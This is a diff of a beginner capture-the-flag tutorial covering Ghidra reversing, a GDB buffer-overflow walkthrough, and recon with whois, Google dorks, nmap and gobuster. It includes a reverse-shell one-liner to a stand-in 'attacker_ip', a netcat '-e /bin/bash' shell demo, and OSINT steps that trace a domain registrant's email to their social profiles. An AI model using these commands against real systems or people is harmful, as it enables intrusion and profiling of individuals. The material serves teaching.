+1.  Open in **Ghidra**. Find `main`.
+2.  Decompile reads:
     ```c
-    if (strcmp(input, "SuperSecretPassing") == 0) {
-        give_flag();
-    }
+    int valid = 0;
+    if (input + 5 == 100) { valid = 1; }
     ```
-6.  **Solve:** The password is `SuperSecretPassing`.
+3.  Logic: My input plus 5 must equal 100.
+4.  Solution: Input must be `95`.
 
-## 5.4 Binary Exploitation (Pwn)
-Breaking the program to run your own code (Shellcode).
+**Challenge Question 2:** In C, what function is commonly used to compare two strings? (`strcmp`)
 
-### Buffer Overflow
-A buffer overflow happens when a program reads more data into a fixed-size buffer than it can hold.
+---
 
-**The Logic:**
-1.  Variable `buffer` is allocated 64 bytes on the stack.
-2.  Important data (like the **Return Address**) sits right next to it.
-3.  User inputs 100 bytes.
-4.  The first 64 fill the buffer. The remaining 36 spill over ("overflow") and overwrite the Return Address.
-5.  When the function finishes (`ret`), the CPU tries to jump to the overwritten address.
-6.  If you overwrite it with the address of "Give Shell" function -> **You win.**
+## Level 3: Advanced
+**Goal:** Smash the Stack (Buffer Overflow).
 
-### Step-by-Step: Analysis with GDB
-**Scenario:** `vuln` crashes when you give it long input.
+### 3.1 Memory Layout
+*   **Stack:** Where local variables live. Grows down.
+*   **Return Address:** Tells the CPU where to go after a function finishes.
+*   **Buffer Logic:** If you write past the end of a buffer, you overwrite the Return Address.
 
-1.  **Start GDB:** `gdb ./vuln`
-2.  **Run:** `r` -> Program starts.
-3.  **Crash it:** Type `AAAAAAAAAA...` (lots of A's).
-4.  **Check Crash:** Program stops with `Segmentation fault`.
-5.  **Inspect EIP:** `info registers`.
-    *   If `eip` is `0x41414141` (`AAAA`), it means you successfully controlled the execution pointer.
+### 3.2 GDB (GNU Debugger)
+*   `gdb ./vuln`: Start debugging.
+*   `break main`: Stop at the start.
+*   `run`: Start the program.
+*   `x/10s $esp`: Examine 10 lines of the stack pointer.
+
+### Practice 3.1: Controlling EIP
+**Scenario:** `vuln` has a buffer of 64 chars.
+1.  Create input: Python `print("A"*70)`.
+2.  Run inside GDB: `run < input.txt`.
+3.  App crashes: `Segmentation Fault`.
+4.  Check registers: `info registers`.
+5.  `EIP` is `0x41414141` (`AAAA`).
+6.  **Conclusion:** You control exactly where the program jumps next.
+
+**Challenge Question 3:** What is "Shellcode"? (A small piece of code used as the payload in an exploit, often spawning a shell).
 
 ---
 
 # Chapter 6: Networking & Reconnaissance
 
-## 6.1 The Language of the Internet (TCP/IP)
-Hacking is often just manipulating network traffic.
+## Core Concepts & Definitions
+**Networking** is how computers talk. **Reconnaissance** is gathering intelligence before an attack.
 
-### The TCP 3-Way Handshake
-Before data sends, a connection must be established. This is polite networking.
+**Key Terminology:**
+*   **IP Address:** The logical address of a machine (`192.168.1.1`).
+*   **Port:** An address for a specific service (`80` for Web, `22` for SSH).
+*   **Protocol:** The rules of communication (TCP, UDP, ICMP).
+*   **WHOIS:** A database of domain owners.
 
-<!-- Placeholder: [Image: tcp_handshake.png] - SYN, SYN-ACK, ACK flow diagram -->
+---
 
-1.  **SYN:** Client sends "Hello, I want to talk" (Synchronization).
-2.  **SYN-ACK:** Server sends "Okay, I'm listening" (Synchronization + Acknowledgment).
-3.  **ACK:** Client sends "Great, let's start" (Acknowledgment).
+## Level 1: Fundamentals
+**Goal:** Gather information without touching the target server.
 
-*   **CTF Tip:** A "SYN Scan" (Nmap default) sends step 1. If it gets step 2 back, the port is open. It never sends step 3, making it slightly stealthier.
+### 1.1 Passive Recon (OSINT)
+Using public information.
+*   **Google Dorking:** Advanced searches.
+    *   `site:target.com filetype:pdf` -> Finds leaked PDF documents.
+*   **Wayback Machine:** Viewing deleted pages of a website.
 
-### Subnetting (CIDR Notation)
-*   `192.168.1.0/24`: The "slash 24" means the first 24 bits (3 octets) are fixed.
-    *   IPs range from `192.168.1.1` to `192.168.1.254`.
-*   `127.0.0.1`: Localhost (Your own computer).
+### 1.2 `ping` and `whois`
+*   `ping google.com`: "Are you alive?" Checks connectivity (ICMP).
+*   `whois google.com`: "Who owns you?" Checks registration info.
 
-## 6.2 Reconnaissance (Enumeration)
-"Give me six hours to chop down a tree and I will spend the first four sharpening the axe." - Abraham Lincoln.
+### Practice 1.1: The Digital Detective
+**Scenario:** You investigate `megacorp.com`.
+1.  Run `whois megacorp.com`.
+2.  Find the "Registrant Name" or "Admin Email".
+3.  Google that email to find social media profiles.
 
-### Active Scanning with Nmap
-Nmap is the King of Scanners.
+**Challenge Question 1:** What does `tracert` (Windows) or `traceroute` (Linux) do? (It maps every hop/router between you and the target).
 
-<!-- Placeholder: [Image: nmap_scan_types.png] - Visualizing different scan techniques -->
+---
 
-#### Step-by-Step: Enumerating a Target
-**Target:** `10.10.10.5`
+## Level 2: Intermediate
+**Goal:** Map the target's attack surface with Nmap.
 
-1.  **Quick Scan:**
-    *   Command: `nmap -sC -sV 10.10.10.5`
-    *   `-sC`: Use default scripts (finds titles, headers).
-    *   `-sV`: Probe open ports to determine service/version info.
-2.  **Full Port Scan:**
-    *   Command: `nmap -p- 10.10.10.5`
-    *   Scans all 65,535 ports. Critical if SSH is hidden on port 2222.
-3.  **UDP Scan:**
-    *   Command: `nmap -sU 10.10.10.5`
-    *   Slow, but finds things like SNMP or TFTP.
+### 2.1 Nmap (Network Mapper)
+The gold standard scanner.
+*   **Scan Types:**
+    *   `-sS` (SYN Scan): Stealthy (Step 1 & 2 of handshake).
+    *   `-sV` (Version): "Which Apache version is running?"
+    *   `-p-` (All ports): Scan 1-65535.
 
-### Directory Busting (Web Recon)
-Finding hidden folders on a web server.
-*   **Tools:** `gobuster`, `dirb`, `dirsearch`.
-*   **Concept:** The tool has a list of words (`admin`, `login`, `backup`). It asks the server: "Do you have /admin?".
-*   **Command:** `gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt`
+### Practice 2.1: The Cartographer
+**Scenario:** Target IP `10.10.10.5`.
+1.  Run `nmap -sV -sC 10.10.10.5`.
+2.  Output:
+    *   `Port 22`: OpenSSH 7.2.
+    *   `Port 80`: Apache 2.4.18.
+3.  Analysis: Search `Exploit-DB` for "Apache 2.4.18 vulnerabilities".
 
-## 6.3 The Swiss Army Knife: Netcat
-Netcat (`nc`) reads and writes data across network connections.
+**Challenge Question 2:** Why might a firewall block a "Ping" (`ICMP`) but allow a Web request (`TCP 80`)? (Security policy often blocks ICMP to hide presence, but Web must be open for business).
 
-*   **Connect to a port:** `nc [IP] [PORT]`
-    *   Example: `nc 10.10.10.5 1337` (Connect to a challenge service).
-*   **Listen on a port:** `nc -lvnp [PORT]`
-    *   `-l`: Listen mode.
-    *   `-v`: Verbose.
-    *   `-n`: No DNS lookup (faster).
-    *   `-p`: Port number.
-    *   Example: `nc -lvnp 4444` (Waiting for a reverse shell to connect back to you).
+---
+
+## Level 3: Advanced
+**Goal:** Establish Command & Control (C2) with Netcat.
+
+### 3.1 Netcat (`nc`)
+The "Swiss Army Knife". It reads and writes TCP/UDP connections.
+*   **Connect:** `nc [IP] [PORT]` -> Acts like a browser/client.
+*   **Listen:** `nc -lvnp [PORT]` -> Acts like a server.
+
+### 3.2 The Reverse Shell
+The "Holy Grail" of hacking.
+1.  **Attacker:** Starts a listener. `nc -lvnp 4444`.
+2.  **Victim:** Runs a command that connects BACK to the attacker and gives them a shell (`/bin/sh`).
+    *   Command: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
+3.  **Result:** Attacker sees a command prompt of the victim machine.
+
+### Practice 3.1: Catching a Shell
+**Task:** Simulate a reverse shell locally.
+1.  Terminal 1 (Attacker): `nc -lvnp 9001`
+2.  Terminal 2 (Victim): `nc 127.0.0.1 9001 -e /bin/bash`
+3.  Go back to Terminal 1. Type `ls`. You should see the files!
+
+**Challenge Question 3:** What is a "Bind Shell"? (The opposite of Reverse Shell; the victim opens a port and listens, attacker connects to them. Less common due to firewalls blocking incoming ports).
